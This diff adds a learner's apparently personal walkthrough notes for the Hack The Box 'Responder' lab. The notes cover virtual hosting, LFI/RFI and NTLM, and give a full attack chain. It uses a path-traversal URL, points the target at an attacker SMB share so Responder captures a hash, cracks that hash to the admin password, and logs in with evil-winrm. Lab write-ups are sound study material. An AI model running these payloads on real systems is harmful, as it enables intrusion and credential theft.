@@ -1,0 +1,157 @@
+	• On opening Firefox and putting http://[target ip] , the browser returns a message about being unable to find that site. Looking in the URL bar, it now shows http://unika.htb .
+
+	• The website has redirected the browser to a new URL, and your host doesn't know how to find unika.htb .
+
+	• This webserver is employing name-based Virtual Hosting for serving the requests. 
+	Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server. 
+
+	• This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname. 
+
+	• The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.
+
+
+So because of this we can go to the /etc/hosts file to manually add the Ip
+	
+	• The /etc/hosts file is used to resolve a hostname into an IP address & thus we will need to add an entry in the /etc/hosts file for this domain to enable the browser to resolve the address for unika.htb . 
+	
+	
+	(to go to etc we need to be cd all the way back to user folder) (I think) 
+	
+	
+	
+	echo "10.129.129.125 unika.htb" | sudo tee -a /etc/hosts  
+	
+		○ Basically the echo outputs the text
+		○ | aka the pipe symbol takes output from left and input to the right command
+		
+		○ tee: This is the command that takes the input from echo and "tees" it (sends it to two places).
+		
+		○ -a: This is an option for the tee command. It stands for "append." Without -a, tee would overwrite the existing contents of /etc/hosts. With -a, it adds the new line to the end of the file.
+		
+		○ hosts is the file name 
+
+	
+	
+	• After loading the website, we should go to all pages and see what we can find and after changing the language 
+
+	
+	
+	• we can see that the german.html page is being loaded by the page parameter, which
+	may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized. 
+	
+	
+	
+	• LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. 
+
+	A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not
+	performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system
+	
+	In some limited cases, an LFI can lead to code execution as well.
+	
+	
+	• RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.
+
+
+
+What is NTLM (New Technology Lan Manager)?
+
+	• NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
+	authentication protocol used to authenticate a client to a resource on an Active Directory domain.
+
+			The NTLM authentication process is done in the following way :
+		
+			1. The client sends the user name and domain name to the server.
+			2. The server generates a random character string, referred to as the challenge.
+			3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
+			server.
+			4. The server retrieves the user password (or equivalent).
+			5. The server uses the hash value retrieved from the security account database to encrypt the challenge
+			string. The value is then compared to the value received from the client. If the values match, the client
+			is authenticated
+			
+				An NTHash is the output of the algorithm used to store passwords on Windows systems in the SAM
+				database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
+				NTLM, which is very misleading / confusing.
+				
+				When the NTLM protocol wants to do authentication over the network, it uses a challenge / response model as described above. A NetNTLMv2 challenge / response is a string specifically formatted to
+				include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually
+				a hash. Still, it is regularly referred to as a hash because we attack it in the same manner. You'll see
+				NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.
+				
+				
+				
+				
+	• We can use this to check for contents the hosts file in the server 
+	
+	
+		http://unika.htb/index.phppage=../../../../../../../../windows/system32/drivers/etc/hosts
+
+
+
+
+PDF blob:https://app.hackthebox.com/d0ace20d-bb10-4526-8e70-5d23733c642a
+	
+	In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that
+	PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if
+	allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.
+	In our case, we can misuse this functionality to steal the NTLM hash.
+	
+	How does Responder work? Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB server. When the target machine attempts to perform the NTLM authentication to that server, 
+	Responder sends a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2. 
+	While we can't reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challenge-response, and if we find one, we know that is the password. This is often referred to as hash cracking, which we'll do with a program called John The Ripper.
+	https://github.com/lgandx/Responder clone this and use the responder utility 
+	
+	
+	sudo python3 Responder.py -I tun0 (using -I we can specifiy which network interface to use
+	
+		○ This command is used to turn the responder on 
+	
+	
+		SO now we will need to google search with the responders ip address which is mentioned when starting it 
+		
+		
+		http://unika.htb/?page=//10.10.14.219/somefile   (filename can be anything) 
+		
+		
+		
+		We can see this now we select the entire hash and echo it into a file 
+		
+		Echo "hash" > hash.txt (> is like into) 
+		
+		Now we can use john the ripper 
+		
+		
+		
+		
+		
+		
+		
+		Now we can see that the password for the account Administrator is badminton 
+		
+		We can use WinRM (windows remote management)  (we know this because the nmap scan showed us its using windows server 
+			
+			
+			is a Windows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as Operating Systems and applications. WinRM allows the user to :
+			 → Remotely communicate and interface with hosts 
+			→ Execute commands remotely on systems that are not local to you but are network accessible. 
+			→ Monitor, manage and configure servers, operating systems and client machines from a remote location
+			
+			
+			§ Now we can do evil-winrm -i 10.129.129.125 -u administrator -p badminton
+			
+			§ Now we need to use windows commands like: 
+
+				□ cd .. 
+				□ Dir
+				□ type filename (to get the content inside of a file) 
+				
+				echo "new content" > filename.txt
+echo  "new content" >> filename.txt
+				
+				The > operator will overwrite the file, while >> will append to it. These work similarly to Linux redirection operators.
+		
+How we got in 
+	
+	• As a pentester, this means that if we can find credentials (typically username and password) for a user who has remote management privileges, we can potentially get a PowerShell shell on the host.  
+	
+	• (this is what we just did, we kinda sent a fake smb server and it tried to do the NTLM authentication to that server, that way we captured using responder one of the hash passwords which we cracked and now we can use WinRM to get into the system using those credentials 
